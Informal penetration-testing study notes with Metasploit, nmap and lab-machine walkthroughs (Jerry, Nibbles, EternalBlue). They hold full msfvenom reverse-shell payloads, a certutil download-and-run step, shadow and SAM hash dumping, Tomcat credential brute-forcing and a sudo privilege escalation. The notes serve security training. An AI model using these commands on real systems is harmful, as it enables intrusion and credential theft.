# pentest-notes
--------------------------------------------------------------------------------------------------------------------------------------------

Metasploit Basics:

Configuring metasploit database:
//# systemctl start postgresql
//# systemctl enable postgresql
//# msfdb init
//# msfconsole -q
//# db_status

Selecting an exploit example:
// msf > use exploit/windows/smb/ms17_010_eternalblue
// msf exploit(ms17_010_eternalblue) > info

Selecting a payload example:
// msf exploit(ms17_010_eternalblue) > show payloads
// msf exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
// msf exploit(ms17_010_eternalblue) > options

To put a session in the background:
// meterpreter > background

Return to a session example:
// msf exploit(ms17_010_eternalblue) > sessions
// msf exploit(ms17_010_eternalblue) > sessions -i 1


--------------------------------------------------------------------------------------------------------------------------------------------

Scanning process:
//# namp -T5 -A -p- --min-rate=500 IP
OR
//# namp IP//
//# nmap -SCV -sS -T4 -p
OR
//# nmap -A -T4 -p- "ip" //
OR
//# nmap -sU -A -T4 -p- "ip" //udp
OR
//# nmap -T4 -p- 'ip' // for faster results
//# nmap -A -T4 -p21, 80, 433 "ip" //specific ports

--------------------------------------------------------------------------------------------------------------------------------------------
check host script results: ...

Stealth Scan(does a syn -> syn ack -> rst)

finding open ports:

if running smb port 139/445:
//# smbclient -L \\ip\ or \\\\ip\\

if access shows file share list:
//# smbclient \\\\ip\\ADMIN$ //etc

if smbclient access failed: nt_status_invalid_parameter
do further enumeration with metasploit

Root password can be anonymous.

--------------------------------------------------------------------------------------------------------------------------------------------
if port 21 is open: service ftp:
ftp "ip"
un: anonymous
password: anonymous
ls
file can be uploaded in ftp server

look for anonymous ftp login: ok for internal server but bad for external facing servers
some ftp verison are buffer overflow vulnerable

--------------------------------------------------------------------------------------------------------------------------------------------

If port 22 is open for ssh:
can be checked for bad passwords with brute force

--------------------------------------------------------------------------------------------------------------------------------------------

search smb_version: if version smb version already given:
google exploits
//# msfconsole
//# systemctl postgresql enable
from rapid 7
> use exploit/multi/samba/usermap_script
> options
> set rhosts "ip"
> show targets
> run
> whoami //root highest for linux 
> hostname
> pwd
upadatedb
locate root.txt
cat /etc/passwd // has service account at top and user accounts in botton, password stored in shadow files x
cat /etc/shadow
use unshadow tool
//# gedit passwd
//# gedit shadow
//# unshadow
//# unshadow passwd shadow
x in passwd will be replaced by the hash in shadow
crack hash with hashcat


//# msfconsole
> search smb_version
> use auxiliary/scanner/smb/smb_version
auxiliary(scanner/smb/smb_version) > options
search for required 'yes' and no current setting enabled

if remote host:
auxiliary(scanner/smb/smb_version) > set rhosts "ip" or "ip/24" (for all machines in network)
rhost should be set to the ip
auxiliary(scanner/smb/smb_version) > run

research info found: for exploits
exploit db or rapid 7

in case windows xp sp3:
auxiliary(scanner/smb/smb_version) > use exploit/windows/smb/ms08_067_netapi
exploit(windows/smb/ms08_067_netapi) > options
exploit(windows/smb/ms08_067_netapi) > set rhosts "ip"
exploit(windows/smb/ms08_067_netapi) > show target

for automatic targetting:
exploit(windows/smb/ms08_067_netapi) > run

"meterpreter session 1 opened" (opened shell, accessed)
reverse shell (creates a listening port), have target connect back (usually internal)
bind shell connecting to the target (usuallyl external)



> getuid
nt authority\system = highest level else use getsystem command to elevate
> sysinfo
architecture should match the meterpreter shell eg x86

> help // to for all commands to do on an accesses machine

> hashdump //dumps sam->storing local user passwords crack hash with john the ripper or hash cat whole hash or part of hash seperated by : using crack map exec, ps exec

> shell (would give similar to windows cmd)
> cd c:\
> C:\>cd "documents and settings" 
> dir
> cd john
> dir
> cd Desktop
> type user.txt
for root text
C:\Documents and Settings>cd adminitrator\desktop
> type root.txt

looking for sensitive files:
meterpreter > pwd
cd c:\\
pwd
c:\
dir

--------------------------------------------------------------------------------------------------------------------------------------------

Checking for ms17-010 aka eternal blue via smb.
- Mostly found in internal pen tests.
- Allows for remote code executions and gains system access on a machine
- Rpc ports are common for smb
- Windows 7 professional 7601 service pack 1 (vulnerable to eternalblue)
- msfconsole
- search ms17-010
- use auxilary/scanner/smb/smb_ms17_010 (auxilaries are pre exploits) 
- set rhost 'ip'
- run to check if host is vulnerable
- use exploit/windows/smb/ms17_ms17_010_eternalblue
- set rhost 'ip'
- run
- for staged payload: set payload windows/x64/meterpreter/reverse_tcp
if win:
- whoami
- hostname
- getuid
- sysinfo
- hashdump
- shell
- route print
- arp -a
- netstat -ano CLOSE_WAIT and ESTABLISHED 
- 

- Auto blue can be used aswell for eternal blue
- netstat -ano , to check which process is communication is associated with eternal blue
- ps or tasklist for process list
- extra spoolsv.exe or lsass.exe can be indicators of eternal blue
--------------------------------------------------------------------------------------------------------------------------------------------

leveraging and enumerating FTP (port 21) and http port 80
- with port 80, check website via ip address
- look for extra webpage directories using dirbuster
- dirbuster& target url-> http://ip:80
- kali has word list in user/share/wordlist/dirbuster
- for apcahe server use file extension php,txt,rar...
- for windows iis server use asm,asmx,asp,aspx,txt,zip,rar,bak...
- for ftp check for anonymous login
- ftp 'ip'
- un and pass both anonymous
- help and ls to check files
- put 'file' -> to put a file on the server
- ip/file -> check in browser if file can be executed
- use msfvenom for ftp payloads
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=testerIP LPORT=4444 -f aspx > ex.aspx
- ftp 'ip'
- put ex.aspx (if problems try switching to transfer via binary in ftp)

using metasploit
- msfconsole
- use/exploit/multi/handler (opens up a listener similar to netcat nc -nvlp 4444)
- set payload windows/meterpreter/reverse_tcp
- set LHOST testerIP
- run (will start listening)
- ip/es.aspx

if not authority system then
- >background
- search suggester
- use port/multi/recon/local_exploit_suggester (port exploitation enumeration)
- set session 1
- run (will search for exploits that could work)
- (use one or all of the exploits in results) eg > use exploit/windows/local/ms10_015_kitrapod
- check options
- set session 1
- remember to check the correct lhost and lport
- run
- failed attampt will disconnect session

-check all msfvenom payloads(for windows reverse tcp shell) using -> msfvenom -l payloads, if problem with meterpreter

--------------------------------------------------------------------------------------------------------------------------------------------
- linux passwords stored in /etc/shadow and /etc/passwd
- windows password storage, security account manager SAM file, C:\Windows\System32\Config, HKEY_ LOCAL_MACHINE\SAM -> registry
- ssh, brute force, SIEM and SOC should be able to detect it. if not , there are problems in the siem which have to be fixed
- linux log files: # cd /var/log .. dmesg | less .. view last 5 logs, tail -f -n 5 /var/log/syslog
- Windows , C:\> wevtutil /?
- ftp exploit can be used to upload malicious files to server
- / gives a staged payload
- '-' gives an unstaged payload
- http-title: IIS7, usually used on default webpages

--------------------------------------------------------------------------------------------------------------------------------------------

Jerry: Default Credentials

- nmap -A -T4 -p- 'ip'
- tcp port 8080
- Apache tomcat/7.0.88
- 'ip':8080
- burp suite -> proxy -> set browser proxy to the ip and port
- forward request in burp suite, can see whats happening with webpage and forward to intruder, repeater and decoder
- copy tomcay default passwords (github) in file.txt as un:pass
- passwords are sent in base 64
- convert credentials in base 64
- echo -n 'un:pass' | base64
- for x in $(cat file.txt); do echo -n $x | base64; done
- burp suite sniper attack, paste list in payload
- uncheck url encoding and start
- keep eye on response code(200/403) and length
- forward the 200 code password to decoder and convert back to text from base64
- war files are used to upload and deploy applications
- malicious files upload can be used to get reverse shell
- can also view server, os and hostname info via the manager page
- tomcat reverse shell msfvenom
- msfvenom -p java/jsp_shell_reverse_tcp LHOST=ip LPORT=port -f war > shell.war (an unstaged payload '_' '-p')
- set up machine to listen on specified port using netcat
- nc -nvlp port
- upload the war file
- click on file to get session
- c:\Users\Admin\Desktop\flags

reverse shell
- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=port2 -f exe > sh.exe
new terminal
- msfconsole
- use exploit/multi\handler
- set payload windows/x64/meterpreter/reverse_tcp
- run

host webserver with python
- pyhton -m SimpleHTTPServer 80
- go back to target machine and tranfer sh.exe to machine via wget
- certutil -urlcache -f http: //ip/sh.exe c:\user\admin\desktop
- run sh.exe on target

--------------------------------------------------------------------------------------------------------------------------------------------

Nibbles: Web Enumerabtion and Linux Priveldge Escalation
- nmap -A -T4 -p- 'ip'
- port 22/ssh and port 80/http
- port 80 can be a way in
- Apache server info given
- searchsploit apache 2.4 // pull from exploit db. Can find vulnerabilties for the version to report on finding, eg remote/local/dos
- search ip in web browser
- can use nikto/dirbuster/wappalyzer for further enumeration
- can view page source for info leakage
- search some directories ip/directory/ in web browser
- searchsploit nibble
- arbitrary file upload can cause remote code execution
- in searchsploit .rb lisintgs are ususally metasploit modules
- msfconsole
- use exploit/multi/http/nibbleblog/_file_upload
- use dirbuster to find the admin page for the ip
- ip/nibbleblog/admin.php
- for the login,  can use burp suite and brute force with common bad password
- or use cewl for word guessing
- after login success chaeck web app for other leveraging features, eg upload file, settings and versions 
- use the metasploit exploit, with password, username and rhost set. set targeturi/nibbleblog
- once in shell, the history/ sudo command can tell previous commands and get user id to see if root or not
- or cat .bash_history or sudo -l (for no passwords) will show files that can be run without password
- can download files with mget *
- uname -a for version
- enumerating liux form user to root some good scripts example: linEnum.sh, linuxprivchecker.py or other scripts by netsec
- can either create the mal file in the target directory or download from the attack machine webserver with wget
- echo "bash -i" > monitor.sh (executes interactive bash and runs as root), since sudo -l gave the name moniter.sh
- sudo moniter.sh (on target machine) may have to run with full directory sudo ../../../moniter.sh 'enter' id
- cd /root
- cat root.txt
--------------------------------------------------------------------------------------------------------------------------------------------
Possible findings to report:
- post scan, Information disclosure under http-sever-header
- services open with anonymous login
- default webpages and admin pages, anything not needed should be off or accessible only through vpn
- brute force attacks should be picked up by the siem
- Message signing: disbaled (dangerous, but default) 
















